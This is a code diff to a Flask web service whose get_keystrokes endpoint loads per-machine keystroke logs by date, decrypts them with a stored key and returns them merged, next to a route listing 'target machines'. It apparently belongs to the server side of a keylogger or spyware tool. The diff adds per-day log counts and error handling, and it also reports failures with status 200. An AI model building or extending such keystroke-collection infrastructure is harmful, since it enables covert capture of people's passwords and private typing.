@@ -106,6 +106,8 @@ def get_keystrokes():
         return jsonify({"error": "invalid date range"}), 400
 
     dates = get_date_list(start_date, end_date)
+    if isinstance(dates,str):
+        return jsonify({"error":dates}), 422
     try:
         with open('data.json', 'r', encoding='utf-8') as f:
             data = json.load(f)
@@ -115,24 +117,24 @@ def get_keystrokes():
         machine_path = data[machine_sn]['path']
         key = data[machine_sn]["key"]
         list_key_logs = []
+        info = {'dates':{}}
         for cur_date in dates:
             file_path = machine_path + "/log_"+cur_date+".json"
-
-            # if not os.path.exists(file_path):
-            #     return jsonify({"error":"logs file not found"}),400
-
-            with open(file_path, 'r',encoding='utf-8') as f:
-                list_key_logs+=json.load(f)
-
-            # except Exception as e:
-            #     return jsonify({"error":"logs not found"}),400
+            try:
+                with open(file_path, 'r',encoding='utf-8') as f:
+                    day_list = json.load(f)
+                list_key_logs+=day_list
+                info['dates'][cur_date] = len(day_list)
+            except FileNotFoundError:
+                info['dates'][cur_date] = 0
 
         decrypt_data_list = [{decrypt(key,k): decrypt(key,v) for k, v in data.items()} for data in list_key_logs]
         merged_data = merge_dicts(*decrypt_data_list)
-        return jsonify({"logs":merged_data}), 200
-
+        return jsonify({"logs":merged_data,"info":info}), 200
+    except IndexError:
+        return jsonify({"error": 'no data find'}), 200
     except Exception as e:
-        return jsonify({"error":str(e)}), 500
+        return jsonify({"error":str(e)}), 200
 
 
 @app.route('/api/get_target_machines_list', methods=['GET'])
